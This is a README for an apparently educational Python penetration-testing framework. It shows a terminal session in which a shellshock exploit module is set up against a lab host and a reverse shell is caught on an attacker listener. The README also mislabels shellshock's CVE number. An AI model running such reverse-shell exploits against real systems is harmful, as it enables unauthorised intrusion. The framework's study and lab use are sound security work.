# pysploit

This is a metasploit-like framework for system exploitation and penetration 
testing written in python. It is a work in progress and is an educational 
exercise for me so I learn how things actually work and stop being such a skid.

### Example of exploitation of the shellshock vulnerability (CVE-2014-6071)

```
$ pysploit.py
[+]	New session created
[*]	Starting the network handler
	[+]	Network handler started successfully!
[*]	Initializing all the initializables

         ,__________    ,__
        /   __      |  /  /
       /   /_/  /|   \/  /
      /   ,____/  \     /
     /   /        /    /
     `--'         `---' sploit

$ pysploit> exploit load shellshock
$ exploit (shellshock)> exploit options
[~]	Exploit options	[~]
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
victim_ip               |		None
victim_port             |		None
attacker_ip             |		None
attacker_port           |		None
cgi_path                |		None
payload                 |		None
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
$ exploit (shellshock)> exploit set victim_ip 192.168.56.101
$ exploit (shellshock)> exploit set victim_port 80
$ exploit (shellshock)> exploit set attacker_ip 192.168.56.102
$ exploit (shellshock)> exploit set attacker_port 4444
$ exploit (shellshock)> exploit set cgi_path /cgi-bin/status
$ exploit (shellshock)> exploit set payload None
$ exploit (shellshock)> exploit options
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
victim_ip               |		192.168.56.101
victim_port             |		80
attacker_ip             |		192.168.56.102
attacker_port           |		4444
cgi_path                |		/cgi-bin/status
payload                 |		None
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
$ exploit (shellshock)> exploit run
[*]	Checking for vulnerability
	[*]	Injecting with test nonce 13b64e57dbff4e63b412d40f02ecc933
	[+]	Received vulnerable output from target!
	[+]	Target 192.168.56.101 is vulnerable to shellshock
[*]	Running exploit for shellshock on 192.168.56.101
	[*]	Shell injection sent (reverse catch at 192.168.56.102:4444)
	[+] Shell caught by listener!
[+]	Exploitation completed!
$ exploit (shellshock)>
```

And on our listening machine...

![We have a catch](https://github.com/spencerdodd/pysploit/blob/master/imgs/example-catch.png "catch img")

As easy as that!

### =-=-=-= To Do =-=-=-=

* Build network module for the framework to handle file-dropping, multi-stage payload uploading, shell-hand
ling, etc.

* Create some payloads / payload execution frameworks (based off of network module interactions)

* Potentially migrate exploitation into Twisted protocols that are created by the exploits (?)